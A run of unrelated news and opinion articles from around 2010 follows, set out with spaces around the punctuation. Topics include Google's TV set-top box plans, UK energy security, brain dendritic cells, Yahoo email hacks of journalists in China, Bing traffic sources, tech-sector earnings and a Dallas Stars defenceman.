My dad gets the calls , and he tells me about it .
I ’d like to go back on “ Saving Grace , ” that ’s my favorite show .
Q .
What do you do when you ’re not acting ?
A .
I work at a law firm , I ’ve been here for 20 years .
I ’ve spoken all over the world , India and Japan .
Dad taught me some Japanese .
I like spending time with family and friends , go bowling and skiing , going to birthday parties .
Q .
You ’ve got a big birthday coming up yourself .
How are you bracing yourself for the big 4-0 ?
A .
Eh , it ’s a big step .
It ’s a milestone .
Might as well just leap for it .
Google is looking to take the Android operating system to the big screen — the one in your living room , anyway .
The company has partnered with Intel and Sony in order to bring a more interactive viewing experience to the TV in the form of ( you guessed it ) set - top boxes .
The idea behind it is giving users the ability to seamlessly switch between Web apps and video entertainment , though there 's already plenty of competition in this space .
Or is there ?
According to the New York Times , Google plans to treat this platform in the same way it treats Android for Mobile — it will open the platform to developers " within the next couple of months " and products could hit the shelves sometime this summer .
That means third - party apps could show up on TV just as easily as they do on our mobile phones , from Twitter apps to games to Wikipedia browsing and more .
It also means , however , that there 's potential for an overflow of apps to be available ( hello iPhone App Store ) .
Why , though , would Google possibly want to do this ?
" Google wants to be everywhere the Internet is so they can put ads there , " an anonymous source familiar with the project told the Times .
Indeed , the company 's goal has long been to try to get ads — these days , targeted ads — in front of users ' faces wherever they go , whether it's on their living room couch , in the car , or walking down the street .
The challenge will be to actually get users on board with yet another set - top box .
There 's already the ( still - a - hobby ) Apple TV , the Roku , the good ol ' TiVo , and numerous others that try to bring videos and more to the TV .
And for those of us who use HTPCs ( in either Mac or PC form ) , what will the Google box bring us that something like Boxee or XBMC does n't ?
On the other hand , if Google does a good job with the UI and ensures the box will work with some decent remotes — according to the Times ' anonymous sources , Logitech may make a specialized remote with a built - in keyboard — the Google box may have more appeal than all of the aforementioned options .
Imagine a set - top box that is not as obnoxious to deal with as a full - blown PC , easy - to - use as an Apple TV , but as open as any of Google 's other projects .
There could be apps for streaming Netflix , YouTube , and more .
Not every product Google unleashes on the public is a hit : witness the deafening silence surrounding Google Wave after its splashy debut last year .
If Google can do a set - top box right and make it easy to integrate into the entertainment center , it has a decent shot in a still - immature market .

Rep . Paul Ryan ’s tax and spending “ roadmap ” is a fascinating critter : conservatives all praise it to the skies but none of them want to actually commit to supporting it .
The reason for their hesitation is obvious : Ryan ’s plan would cut spending dramatically , and supporting it would mean having to explain what , exactly , they ’d cut .
That would be electoral suicide and they know it .
They much prefer their usual game of loudly denouncing “ spending ” without ever having to say what spending they ’re actually opposed to .
However , their reason for supporting Ryan ’s plan is also obvious : it would cut taxes on the rich dramatically , and there ’s nothing conservatives like better than cutting the tax bills of America ’s wealthy .
But how much would it cut taxes on the rich ?
Citizens for Tax Justice has run the numbers and the answer is : a lot .
The very richest of the rich would see their tax bills go down by an average of over $ 200,000 , a whopping 15 % of their income .
Ka-ching !
To make up for that , everyone with an income under $ 100,000 would have their taxes increased by about $ 2,000 per year .
It ’s a sweet deal for the rich .
But even with all the tax increases on the middle class , Ryan ’s plan still raises less revenue than today ’s tax code .
“ It ’s difficult to design a tax plan that will lose $ 2 trillion over a decade even while requiring 90 percent of taxpayers to pay more , ” says CTJ acerbically .
“ But Congressman Ryan has met that daunting challenge . ”
Details are in the table below , where you can find out how much more you ’d have to pay under Ryan ’s plan .
Enjoy .
But two years later , he said , the crabs have recovered , and then some .
“ The other day we were on that reef and someone said , ‘ Have you ever seen so many blue - legged hermit crabs in your life ? ’ ” Mr. Kehoe said .
While acknowledging that some collectors are aware of the dangers of overfishing , Dr. Rhyne said there had been little scientific study of the blue - legged crabs and the hundreds of other species that are collected , including the 15 that make up about 90 percent of the catch .
For example , with certain snails it is not known how long it takes for them to start to reproduce .
If it is more than a year , then harvesting many of them from the same location year after year could be disastrous .
There are many species that are probably not a concern , Dr. Rhyne said , but he added , “ I do n’t think anyone can use the word ‘ sustainable ’ when they do n’t know enough about the animals . ”
What is not in dispute is that the fishery has changed in the past two decades , coinciding with the rise in popularity of reef tanks .
These aquariums include home or office tanks of a few gallons to several hundred gallons or more , and attractions like the 20,000 - gallon coral reef tank at Atlantis Marine World in Riverhead , N.Y. , considered one of the finest anywhere .
Jeff Turner , owner of Reef Aquaria Design of Coconut Creek , Fla. , which builds and maintains large reef aquariums in homes , offices , hospitals and other institutions , says these are not mere decorations , but “ an educational window into the sea . ”
The hobbyists and professional aquarists who undertake these projects , he said , “ are concerned about the marine environment . ”
The popularity of the tanks is reflected in a study of Florida fishery data by Dr. Rhyne , Michael Tlusty , director of the New England Aquarium , and others .
As the researchers detailed in a paper earlier this year in the open- access journal PLoS ONE , the number of organisms collected from 1994 to 2007 increased by about 13 percent a year , on average , to about 8.8 million in 2007 .
Over the same period , the types of invertebrates changed .
In 1994 , only 6 species among the top 15 were collected and sold for their ecological roles as cleaners , grazers , water filters and the like .
The others were harvested for their ornamental value — because they look pretty in an aquarium — or as curios to be sold in shell shops and other stores .
The most popular “ working ” invertebrates were turbonella snails , with about 175,000 collected .
It is easy to identify the changes in the UK ’s energy profile over the last several years that have prompted intensified , and sometimes heated , debate on the issue of the nation ’s energy security .
First , there is no more ‘ coal - from - Newcastle , ’ as cheaper imports into the UK are available from countries as far away as Australia and South Africa .
Second , the UK is the largest producer of oil and natural gas in the EU .
However , after years of being a net exporter of both fuels , the UK became a net importer of natural gas in 2004 .
Government estimates also predict that the country will become a net importer of oil in the near - to - mid - term future .
Third , as far back as 2006 , then Secretary of State for Energy Malcolm Wicks warned that the UK was on a course to lose 30 % of its generating capacity from coal and nuclear over the next 15 years as these plants close down .
It is no wonder then why energy and security of energy supply , understood largely as electric power in the UK , has risen to the top of the agenda across political , economic , energy and national defense agendas .
In February 2010 , a group of leading UK businesses including Arup , Foster + Partners , Scottish and Southern Energy , Solarcentury , Stagecoach Group and Virgin , which constitute the UK Industry Task Force on Peak Oil & Energy Security ( ITPOES ) , released their second report titled “ The Oil Crunch - a wake - up call for the UK economy . ”
An important objective of the report is to lay the foundation for informed discussions by the new government , to be formed by June 2010 , on oil and the nation ’s energy security .
The ITPOES report is broad in scope but focuses on several issue areas that , if corrections are made , can have a positive impact on UK energy security .
Among these issue areas are : transport and mobility , the impact of oil in the agricultural sector on food and food prices ( and incidentally on water usage and clean water availability ) , and the changing nature of power generation and distribution .
Their report ’s recommendations support a number of policy responses that will reduce the demand for oil in an attempt to bring demand into equilibrium with the physical rate at which oil can be extracted ( as opposed to predicting a terminal decline in oil availability itself ) .
The ITPOES report is pessimistic on this last point , given the long lead time it will take to move off an oil economy .
Prior to this , in March 2008 the UK Prime Minister presented to the Parliament , “ The National Security Strategy of the United Kingdom . ”
With a slightly different remit ( global versus local ) , the national security strategy states that , “ The most effective way to reduce the potential security consequences of issues such as climate change and rising energy demand is to take the tough decisions now to tackle them , both as global issues in their own right and their implications for global security . ”
The report goes on further to state that , “ The distinction between ‘ domestic ’ and ‘ foreign ’ policy is unhelpful in a world where globalization can exacerbate domestic security challenges . ”
Such an observation is vastly important , as it directly links a coordinated domestic policy response to the changing global nature of energy markets and the demand for resources and power .
To the credit of both the ITPOES and the Brown government , it is significant that dialogue is taking place within both the public and private sectors concerning the evolution in thinking about energy that is presently underway .
It is time , however , to do more .
The ‘ more ’ in this case considers that ( 1 ) energy security has moved far beyond an exclusive resource issue , and ( 2 ) the need to reiterate again and again that what happens globally impacts locally .
The convergence of these trends and the inclusive nature of energy security itself ( combining both domestic and foreign policy considerations ) is precisely what the United Kingdom today faces as a nation .
The Global Security Context
The United Kingdom ’s energy - security interests are interwoven within the larger global construct of what kind of resources are produced , how power is generated from these resources , and how these resources are moved around the world .
Due to the shifting fortunes of maturing production from domestic British oil fields , for example , Britain ’s largest oil company , British Petroleum ( BP ) , has over the last decade moved aggressively into international markets .
Domestic production of oil has been diversified through the sale of former BP assets to a large number of smaller players , but the overall picture is of a company becoming more , and not less , internationally active .
This in turn has increased its exposure to the gyrations and instabilities that threaten global stability , which in turn impacts on the price of oil , the security of international supply chains , and ultimately resource availability .
Another example of international linkage between UK companies and the world at large is that of Britain ’s BG Group .
BG is presently involved in developing US shale gas , dubbed ‘ the quiet revolution ’ by BG Group ’s Nigel Shaw .
And finally , British Energy — the UK ’s largest electricity provider — is partly owned by France ’s EDF as yet another example of the energy ties that bind within the EU .
Energy interdependence is a stable characteristic of Britain ’s energy and power structure .
It is a reality that must be continually monitored and addressed in national security terms .
It is also one that requires ongoing dialogue between all stakeholders , active diplomacy internationally and economic astuteness at home .
To be sure , with or without Britain , the competition for natural resources around the world will continue to accelerate , driven in large part by the emerging economies of India and China .
For Britain , the objective is to manage competition in such a way that it avoids conflict between competitors ; British policy should support new constructs for consensus building between nations .
British policy should openly acknowlede that these same nations will seek to maximize their own national self - interest in the energy sphere , and concurrently the policy should seek common resolution to common problems among otherwise competitive parties .
This may prove of value in establishing a structure for improved governance and transparency where resources and transactions are concerned , as recently suggested by David G. Victor at the University of California , San Diego ; in establishing other mechanisms that build consensus between energy producers and consumers on critical issues such as international investment in upstream production for fossil fuels ; or in ensuring market access and reducing resource nationalism where new and emerging ‘ green ’ technologies are concerned .
Involving the BRIC ( Brazil , Russia , India and China ) countries in such dialogue is fundamental to progress and success in problem resolution .
Perhaps even more important , British policy should seek to drive consensus forward in Britain itself for the purpose of achieving its energy , environmental and national security objectives .
Whereas the term ‘ bipartisanship ’ is often ascribed as a political bridging activity between political parties in the US , there are considerable differences in terms of how the British Prime Minister is elected and that of the US President that have discouraged ‘ bipartisanship ’ in the UK .
Britain ’s PM is selected by the ruling party , whereas the US President is directly elected by the electorate .
Therefore , perhaps outside official Westminster , but altogether among members of Parliament , a mechanism should be created to drive forward consensus on an issue of such national importance as energy security .
To be sure , UK energy policy is heavily impacted and influenced by its membership in the EU .
It is often mentioned , and correctly stated , that by - and - large 80 % of EU member states ’ national policies are now determined in Brussels .
While energy generation has largely remained a domain of national sovereignty , environmental legislation , and in particular GHG emissions , have been greatly impacted by EU directives .
A voice here needs to be raised , and intelligent arguments put forward , on the security implications of energy and environmental legislation coming out of Brussels and arriving on Britain ’s shores .
The UK also belongs to a large number of other important international organizations involved in the energy sector .
Most importantly , this includes the International Energy Agency , the OECD ’s energy arm .
The IEA itself has its own set of challenges , and chief among them is the fact that it does n’t count as members the world ’s largest producer countries , including Saudi Arabia and Russia , and excludes as members the emerging energy consuming giants China and India .
Finally , as a founding member of NATO , the UK could benefit from energy provisions which may be included in NATO ’s ongoing review of its strategic concept , due for release later this year .
American Secretary of State Hilary Clinton has often referenced the importance of energy security to the security of alliance members , as she did in a speech to NATO representatives in Washington in February .
“ Energy security is a particularly pressing priority , " she said .
" Countries vulnerable to energy cutoff face not only economic consequences but strategic risks as well . "
Last month , Rob de Wijk , a member of the Atlantic Council of the United States ’ Strategic Advisory Group , wrote with respect to this review process that , “ As NATO considers its future strategic posture , it must take into account three dramatic new security challenges that will impact the interests of its members .
First , it must account for the impact of rising poles in the international system .
Second , it must prepare for the security impact of the competition among world powers for scarce resources .
Third , NATO must consider how climate change will impact international security and Alliance interests .
These three principal challenges in this emerging strategic environment require that NATO reconsider its role and mission , in particular the meaning of Articles 4 and 5 of the Washington Treaty , military transformation and partnerships — most importantly the NATO–Russia relationship . ”
One does n’t have to fully agree with de Wijk ’s list of new NATO security challenges , but one cannot dismiss the emerging importance that energy security ( e.g. resource conflicts , emerging instabilities , strategic competition for energy resources ) has found on the Transatlantic agenda .
It appears prominently in the US Quadrennial Defense Review , the National Security Concept of the United Kingdom , and in the National Security Concept of the Russian Federation .
Groups focused on global security and international affairs can choose not to address this issue , but doing so will not make it go away .
Think Global But Act Local
As an island nation , it should come as no surprise that much of British energy policy on the one hand reflects global energy policy dilemmas — including growing dependence on Russian gas imports across Europe and the global effects of climate change — while on the other hand it advances local policy solutions to these challenges .
However , the priorities identified by UK policy makers have been criticized by some as more globally determined than nationally inspired .
Among the highest priorities of UK energy policy are the following :
- a reduction of UK carbon emissions by 60 % by 2050
- a focus on the importance of energy efficiency
- the large scale introduction of ‘ green ’ carbon neutral technologies for new power development
These policy priorities largely reflect the EU ’s 20 - 20 - 20 program in which it calls for a 20 % reduction in carbon emissions , a 20 % improvement in energy efficiency , and 20 % of power to be produced from renewable resources and technologies .
In contrast , in December 2009 a report by the Economic Policy Centre ( EPC ) in London entitled , “ Securing Our Energy Future : Why and How It Must Be Done , ” challenges these priorities and criticizes them — at best by characterizing them as pandering to outside ( EU interests ) , and at worst by characterizing them as misdirected and misinformed .
The EPC policy paper recommends the following by prioritizing :
Energy Security — without certain access to energy , there can be no economic activity .
Energy Affordability — unless the price of access is low enough , economic activity will be limited .
Environmentally Clean Energy — making the procurement of energy clean primarily at the point of generation , and , secondly , at the point of consumption , to the general benefit of the human environment .
Intensified negotiation between UK policy makers and the expert public that take these issues to heart could be a pathway to a clearer understanding and appreciation of energy security as a priority .
Driving Dialogue
To be sure , a concerted effort needs to be made to bring together the three groups referenced above that have already a pronounced interest and dedication to the issue of UK energy security : the British government and civil service , the ITPOES , and economists at the Economic Policy Centre .
This is but one example among many others .
While these three groups may not hold identical priorities as to what needs to be done and in what order , they ostensibly could agree on the fact that a more coherent process on energy security in the UK is required .
By - in to this process would be based on the following principles :
Securing the UK ’s energy future requires a hybrid of input from all sectors .
Power generating capacity in the UK must seriously consider contributions from all sectors .
Energy security requires diversity of fuels in the transport sector .
Environmentally clean energy is the preferred path forward .
It must be seriously pursued , yet concurrently balanced with the national security interests of the state and its people .
UK energy security , whether in power or resource acquisition , is interdependent with others around the world .
Dialogue can better facilitate an understanding of these interdependencies and can contribute to consensus building on key issues of importance to both energy producers and consumers .
Going Forward : Transport Diversification , Shale Gas & Cyber - Terrorism for Starters
Perhaps the best approach towards moving the energy dialogue in the UK forward is to advance the notion that national defense begins at home .
And in the UK , as elsewhere , there is no greater sector susceptible to fuel price volatility than in the transport sector .
According to the ITPOES report , in 2008 a full 50 % of overall oil consumption in the UK was due to road and air transport consumption .
While there is no short - term solution to replacing oil in these transport modalities , there are long term public policy options , already advocated and advanced globally , that can ease the oil burden in these transport sectors .
This is not an anti-oil argument .
Diversifying fuel transport options in air - and road - based transport is a step towards enhancing UK national security .
The reality is that oil has a monopoly over the transport sector , and the UK is dependent on oil imports from near and far for maintaining this function so critical to human and industrial activity .
A second area that holds promise for enhancing the UK ’s energy security relates to recent advancements in shale gas exploration and development .
Shale gas production has been a hotbed of activity in the US , and attention is now turning to the UK .
UK producer IGas Energy has announced plans to develop a domestic shale resource extending across 300,000 acres in northwest England .
While much work has to be accomplished with respect to the regulatory framework governing shale gas and assessing the environmental impact of its capture , this in principle could add to the UK ’s domestic gas availability at a time when North Sea production is declining .
Depending on delivered cost , it could also help ease growing dependency on imports of natural gas and reduce the geopolitical exposure this causes .
A third area that could coalesce the IT and energy industries together writ large and add a greater degree of protection to critical infrastructure in the UK would be a concerted focus on the ongoing struggle against cyber - terrorism .
This is the new battlefield in this the early part of the 21st century .
In June 2009 the Cabinet Office of the Prime Minister released a study on the Cyber Security Strategy in the United Kingdom , but much more needs to be done , and more value added , to engender ongoing discussions about how to protect the UK ’s homeland in this critical domain .
The issues mentioned above provide at a minimum a departure point for discussion between UK stakeholders in the field of energy and security .

The human brain is a delicate organ , robustly defended .
A thick skull shields it from any direct exposure to the outside world , and the blood - brain barrier keeps out any foreign substances that are circulating within .
New research shows that the brain may have its own specialized immune defenses , too .
In 2008 , researchers at Rockefeller University first identified a population of dendritic cells , the sentinels of the immune system , that was native to the brain .
Now they have shown that these cells are not likely sleeping on the job .
In experiments published recently in Proceedings of the National Academy of Sciences and Brain Behavior and Immunity , the researchers show that these brain dendritic cells can muster the immune system 's soldier T cells when confronted by certain threats .
They also show that , unlike dendritic cells from elsewhere in the body , brain dendritic cells line up along the periphery of stroke - damaged brain tissue , perhaps as a barricade protecting the healthy cells outside .
" We knew they were there and now we know they are immunologically functional , " says Karen Bulloch , director of Rockefeller 's Neuroimmunology and Inflammation Program , which was funded by the Peter Deane Trust following the initial discovery of brain dendritic cells .
Bulloch is a research associate professor who works with Bruce S. McEwen 's Harold and Margaret Milliken Hatch Laboratory of Neuroendocrinology and the Laboratory of Cellular Physiology and Immunology headed by Ralph M. Steinman , who discovered dendritic cells in 1973 .
Dendritic cells capture and process foreign substances called antigens before presenting them to T cells , which multiply and attack the invaders .
To test their activity in the brain , the researchers , led by Rockefeller graduate Andres Gottfried - Blackmore , now a student at Weill Cornell Medical College , injected a mouse brain with interferon-γ , an immune - response molecule produced during specific inflammatory responses .
They found that the interferon increased the number of brain dendritic cells without recruiting dendritic cells from elsewhere in the immune system .
They then exposed the dendritic cells to a model antigen called OVA , prompting a proliferation of OVA - specific T cells .
The brain dendritic cells also proved far more effective at stimulating T cell proliferation in the same test than similar immune - related cells called microglia , which reside in the brain in huge numbers .
The difference suggests a specialized role for brain dendritic cells .
In other experiments , led by postdoctoral fellow Jennifer Felger and in collaboration with the laboratory of Costatino Iadecola at Weill Cornell , researchers studied the response of brain dendritic cells labeled with a fluorescent protein after inducing strokes in mice .
Unlike dendritic cells from elsewhere in the body , which were drawn into the stroke - damaged tissues , brain dendritic cells closed ranks around the perimeter of the damage , forming a barrier between stricken and healthy tissues .
Brain dendritic cells remain largely mysterious , but their immune - related activity suggests they play an important part in protecting the brain .

Yahoo has over 600 million users and is second in the search market The Yahoo e-mail accounts of foreign journalists based in China and Taiwan have been hacked , according to a Beijing - based press association .
Rival Google has been involved in a high - profile row with the Chinese government following similar cyber- attacks against Gmail accounts .
The Foreign Correspondents ' Club of China ( FCCC ) has confirmed eight cases of Yahoo e-mail hacks in recent weeks .
Yahoo said it condemned such cyber - attacks .
But the FCCC accused Yahoo of failing to update users about the situation .
" Yahoo has not answered the FCCC 's questions about the attacks , nor has it told individual mail users how the accounts were accessed , " a spokesman told the news agency .
Yahoo said in a statement that it was " committed to protecting user security and privacy " .
Clifford Coonan , a reporter for the Irish Times , told the AFP news agency that he had an error message when he logged into his Yahoo account this week .
" I do n't know who 's doing it , what happened .
They ( Yahoo ) have n't given any information , but it seems to be happening to journalists and academics in China , so that 's why it 's a little suspicious , " he said .
Great Firewall China censorship has hit the headlines since the high profile cyber-attacks against the Gmail accounts of Chinese human rights activists in January .
The hacks led the search giant to redirect its traffic to an uncensored site in Hong Kong earlier this month .
The Chinese government reacted with anger , saying it was " totally wrong " to blame the authorities for the attacks , the source code of which originated in China .
It does operate a tight control over internet content , including pornography and sensitive political material , in what is dubbed the Great Firewall of China .
Earlier in the week Google blamed the great firewall for blocking its search service , although it said it did not know if it was a technical glitch or a deliberate act .
The issue is now resolved , a Google spokesman said in a statement .
" Interestingly our search traffic in China is now back to normal - even though we have not made any changes at our end .
We will continue to monitor what is going on " , he said .

The Fed is stuck in a bind :
With 10 % unemployment , it can't raise interest rates .
With zero interest rates , however , it can't prevent another asset bubble .
The problem , Stephen Roach , says is the Fed 's impossible dual mandate : protect the value of our money AND keep the economy humming .
That combination will cause the Fed to keep rates too low for too long .
Simon Kennedy , Bloomberg : The Federal Reserve may cause another crisis by botching the withdrawal of liquidity from the U.S. economy , Morgan Stanley Asia Chairman Stephen Roach said ...
“ There is a great risk in the coming exit strategy , ” said Roach , a former Fed economist .
“ They are lacking primarily a political will to execute the exit in a timely and expeditious fashion that will avoid the mistakes of the last crisis . ”
The traditional view of central bankers that asset bubbles are hard to spot and deflate with rates is “ ludicrous , ” he said .
“ This is a failed flaw in the intellectual construction of modern central banking that must be addressed , ” said Roach .
“ If we do n’t fix this problem we ’re doomed to repeat the failed asymmetric policies of the past and set ourselves up ” for another crisis .

The election approaches and Britain begins the long haul out of recession .
What will the Conservatives do to the economy ?
David Cameron has claimed Margaret Thatcher 's economic revolution as his own .
She had , he said , engineered an enterprise economy that was the envy of the world .
Today " our country does not face economic breakdown .
We 've won the economic argument . "
But , after three turbulent decades , it has ended in calamity .
The Conservative economic revolution of the 1980s casts a long shadow .
It broke the power of organised labour , deregulated the economy and opened it up to global market forces .
The 1980 Housing Act and the " right to buy " launched a neoliberal hegemony .
Geoffrey Howe 's 1981 austerity budget of public spending cuts and tax increases pitched Britain into mass unemployment and helped destroy the last vestiges of the postwar welfare consensus .
His goal was to transfer wealth from the public to the private sector , and so unleash free enterprise .
It created a bling economy but little productive wealth .
In 1978 there were 7.1 million employed in manufacturing , by 2008 that had fallen to 3 million .
There has been no significant private investment in the deindustrialised regions .
They have still not recovered their social fabric or productive economies and are now sustained by government spending .
The promise of a " property - owning democracy " created more home ownership , but no investment for future generations .
Now there is a housing crisis .
Financial deregulation turned the housing market into the centre of a casino economy that grew on asset bubbles and speculation .
Dynastic levels of wealth grew alongside some of the highest levels of poverty and inequality in Europe .
Over the last 30 years the share of the nation 's wealth owned by the bottom half of the population has fallen from 8 % to 5 % .
The share of national wealth going to wages has dropped dramatically .
The connection between productivity and wages was broken , and by 2000 productivity increases ran at twice the rate of wage increases .
The Conservatives tore up the welfare safety net by undermining the value of benefits and the state pension .
Low - and middle - earning households borrowed to sustain their standard of living , creating unprecedented levels of personal debt .
The Conservative economic legacy is a massive transfer of wealth and power away from the majority of the people to capital , away from the poor to the rich , and away from the country to London .
The economy has been financialised at the expense of more equitable productive wealth creation .
Cameron has no political economy to enact his pro-social politics and his rhetoric of social justice .
His compassionate Conservatism detoxified the Tory brand , but it is opposed by a free - market hinterland of hard right prospective parliamentary candidates amongst others .
Now falling polls and faltering morale are galvanising them to rally against him .
George Osborne , the shadow chancellor , embodies this conflict .
His policies face both ways at once .
In last week 's Mais Lecture he set out his new model of economic growth : " The only sustainable route to prosperity is raising the real rate of return on investment . "
His solution to restoring profitability is to unleash " the forces of enterprise " .
A nation of savers will generate the funds for investment and growth .
Osborne 's belief in the alchemy of fiscal rectitude , high savings and free markets will repeat the neoliberal policies of Howe 's 1981 budget that set Britain on the road to financial disaster .
The recovery is being driven by public spending .
Business is reacting to weak demand and cutting back on investment .
Without investment to generate demand and rebuild the economy , we will fall back into recession .
When the private sector wo n't invest , the government must .
Labour needs to develop its political economy for a new era .
The future is Labour 's to win .
The challenge is to recover its campaigning role by building a new covenant with the people : a minimum income entitlement , for example , through the guarantee of a living wage and a citizen 's pension ; a referendum on constitutional reform ; a crusade to build homes and reform the housing markets ; a government industrial activism for the new green industrial revolution .
The longer - term goal is to reverse the transfer of wealth and power from the many to the few , and create a more reciprocal society of freedom and security .

What sites send Bing the most traffic ?
Here ’s a surprise .
According to Hitwise , Google is Bing ’s fourth largest referring source .
Below are the top five sites that drive traffic to Bing , or “ upstream ” to Bing , as Hitwise calls it :
MSN is by far the top source , the last site visited by 42.7 % of Bing users before they went to Bing .
That ’s not surprising .
MSN — Microsoft ’s portal — has long been a huge search driver for Microsoft .
In fact , the company recently said that half of all Bing queries come from MSN .
Bing is also the default web search engine for Facebook , so Facebook makes sense as the number two referrer , at 4.6 % of traffic .
Windows Live Mail — that ’s another Microsoft property that ties into Bing search — so it ’s another one that makes sense logically .
It ’s at 4.4 % of traffic .
But Google as the fourth largest referring source , at 4.1 % ?
Google , which competes against Bing ?
How ’s that happening ?
Probably two ways .
First ,
Bing buys ads on Google , like this :
You can find Bing ads showing up on searches at Google for bing , cashback , search engines , flight comparison and image search , to name some examples .
Interestingly , Bing does n’t appear to be buying ads against its tagline , that it is a decision engine .
Bing also does a lot of TV advertising .
TV ads are known to drive search queries .
So there ’s a good chance that when someone sees a Bing ad , they decide to google Bing and discover what they ’ve just seen !
All this also applies to Yahoo , which drives 1.9 % of traffic .
Bing advertises there , and TV ads probably generate queries on Yahoo for Bing , as well .
It ’s clear people do search for Bing by name on Google .
Using Google Trends , we can see the growth of this over the last year .
Here ’s the search volume of those seeking Bing on Google :
Still , that ’s nothing compared to the number of searches that happen for Yahoo on Google .
Here ’s the Bing chart again , this time with searches for Yahoo on Google added in :
Oddest of all , currently more people search on Google for Google than for Yahoo or Bing .
Here ’s the chart :

Senate parliamentarian Alan Frumin ruled against Senate Republicans Monday night , setting aside the first of many expected procedural objections from the GOP .
The parliamentarian ruled that changes to a proposed excise tax on high - cost plans would not violate the 1974 Budget Act by changing contributions to the Social Security trust fund .
ADVERTISEMENT
Republican procedural experts had argued the impact on Social Security was enough to violate the Byrd Rule and derail the whole bill .
Republicans also objected on grounds the excise tax would not go into effect until after the five - year window set by the Budget Resolution .
The parliamentarian has not yet ruled on this issue , according to a senior GOP aide .
" The parliamentarian issued guidance on the 310g point of order challenge to the entire bill , " said the aide .
" Not in our favor this time .
" Democrats had already reviewed the bill in an eight - hour meeting with Frumin and removed portions he signaled could run afoul of budget rules .
Senate Budget Committee Chairman Kent Conrad ( D - N.D. ) predicted that the parliamentarian may rule against them on some issues but that such setbacks would have little impact on the cost or policy substance of the legislation .
Monday was the first time Frumin met jointly with Democrats and Republicans to discuss the reconciliation package .
Republicans plan to raise another challenge on grounds the bill would improperly establish a healthcare reform implementation fund with a $ 1 billion appropriation .
GOP aides argue this would violate the Budget Act's Byrd Rule because the expenditure falls within the jurisdiction of the Appropriations Committee , which did not receive a reconciliation instruction from the Budget panel .
Only the Finance and Health , Education , Labor and Pensions ( HELP ) Committees received reconciliation instructions .
Republicans plan on raising other objections throughout the week .
" Because the notoriously messy reconciliation process has yielded so many drafting errors , Republicans will spend the week identifying each error and using all available tools to strike them from the text , " said a GOP aide .
Since the beginning of the year , doubts about economic recovery have sent markets on a roller - coaster ride , but the IT sector keeps plugging along , showing signs that it is becoming increasingly dynamic .
Hewlett - Packard , the biggest tech company in the world , on Wednesday joined other bellwether vendors such as Intel , IBM , Google and Microsoft that have recently announced strong quarterly earnings .
HP reported a 28 percent jump in profit compared to last year , to US $ 2.3 billion , for the quarter ending Jan. 31 .
It was the first major vendor to report results through the full month of January .
For bottom - line watchers who are worrying about the pace of economic recovery , HP 's 8 percent revenue gain , to $ 31.2 billion , should have been the most important figure in the report .
While profit can be boosted by cutting costs , companies increase revenue by selling more products and services , ultimately the real path to recovery .
HP 's printer , industry - standard server and PC businesses all reported sales growth , though services revenue declined slightly .
Dell on Thursday reported a drop in profit during the fourth quarter of the company 's 2010 fiscal year , which ended Jan. 29 , but said strong sales of laptops and servers helped revenue increase from the year - earlier period .
Revenue improved in all businesses , rising to $ 14.9 billion , compared to $ 13.4 billion a year earlier .
Investors will want to see the company 's costs contained , because profit declined 5 percent to $ 334 million .
The increase in sales is nevertheless another sign of recovery for the hardware market .
Strong PC sales also mean good news for the chip sector .
Signs that the chip arena is coming back to life came from different vendors this week .
Applied Materials , which makes equipment used to manufacture semiconductors , said profit was $ 83 million compared with a year - earlier loss of $ 133 million for the quarter ending Jan. 31 .
Sales jumped to $ 1.85 billion from $ 1.33 billion .
The company also said its revenue would rise more than 50 percent for the fiscal year ending in October , up from its prior growth forecast of greater than 30 percent .
In another good sign for chips and hardware , graphics processor maker Nvidia on Wednesday reported a fourth - quarter profit of $ 131.1 million , compared to a year - earlier loss .
Revenue jumped more than 100 percent to $ 982.5 million .
The positive news this week went beyond the PC and chip sectors .
Storage - equipment maker NetApp on Wednesday reported quarterly net income of $ 108 million , compared to a loss in the same period last year of $ 82 million .
The company had revenue of $ 1.01 billion , up from $ 746 million in the year - earlier quarter .
Meanwhile , upbeat predictions for the mobile market came out of Mobile World Congress in Barcelona this week .
The ITU issued a statement predicting strong global mobile cellular growth around the world .
Mobile cellular subscriptions globally will rise from about 4.6 billion at the end of 2009 to 5 billion this year , the ITU forecast .
Advanced services and handsets in developed countries and increasing use of mobile health services and mobile banking in the developing world will spur growth in the market , the ITU said .
" Even during an economic crisis , we have seen no drop in the demand for communications services , " said ITU Secretary - General Hamadoun Tour é at the conference .
" I am confident that we will continue to see a rapid uptake in mobile cellular services in particular in 2010 , with many more people using their phones to access the Internet . "
Despite the generally upbeat financial reports from IT companies since the beginning of the year , the value of tech shares on the markets have whipsawed along with other sectors .
Macroeconomic news indicating the general state of the recovery has trumped tech sector reports about rising sales .
On Thursday , for example , markets got what may be a short - lived reprieve , spiking on new data that show gains in the business activity index put out by the Philadelphia Federal Reserve , as well as a 10th straight monthly rise in the index of leading economic indicators issued by the Conference Board , an independent group of economists and analysts .
The tech - heavy Nasdaq rose 15 points to close at 2241 .
However , that 's still below the 52 - week high of 2320 the exchange hit a month ago , and U.S. exchanges -- including the Nasdaq -- started to decline again in Friday morning trading , on news that the U.S. Federal Reserve is hiking its discount rate for lending to banks .
The overriding economic issues recently have centered around the frail jobs market and continued home mortgage defaults .
For confidence in IT to grow , strong tech vendor sales need to be accompanied by solid signs of expansion in the larger economy .
As little as 19 days ago , we were trying to figure out why Mark Fistric was a healthy scratch at Pittsburgh on March 6th .
Who ever knows why coaches really scratch guys ?
It could be for little tweaks we do n't know about to the player , or a poor showing at practice , etc .
Who knows ?
What we DID know is that the Stars were leaving guys in front of the net unattended in post -Olympic play , and Mark Fistric was the one guy we could count on to counter that sort of deficiency .
In his nine consecutive starts since the Pittsburgh scratch , Mark Fistric has played an average of 17:51 a game and tallied a +/- rating of +7 .
Should Mark Fistric be getting scratched on important road trips like that ?
He 's been with the team for a while right ?
After all , he was with the team in 2007 - 2008 when they made that big run to the WCF .
Actually , in his career Fistric has only played in ...
131 NHL regular season games .
That sounds low when you think of Nick Grossman who 's played in 213 or Matt Niskanen who 's played in 224 , but it 's one of the biggest reasons that fans have to expect even more improvement out of Fistric next year .
He 's 23 years old and he 's leading the team in plus / minus at +20 .
When Joe Nieuwendyk talks about his young defense improving , ( thus feigning that defensive upgrades are not as necessary as people think ? ) feel free to roll your eyes , but keep one of them on Mark Fistric .
His +20 carries some skepticism with it ; mainly this :
How often does he play against the other teams top line ?
That 's a fair question to ask and it would take a lot of digging to find the answer , but as it is with Brad Richards , I 'd say the same about Fistric :
It 's more frequent on the road than it is at home .
It 's happened enough , and with quite frankly a bad team in Dallas , that it merits recognition .
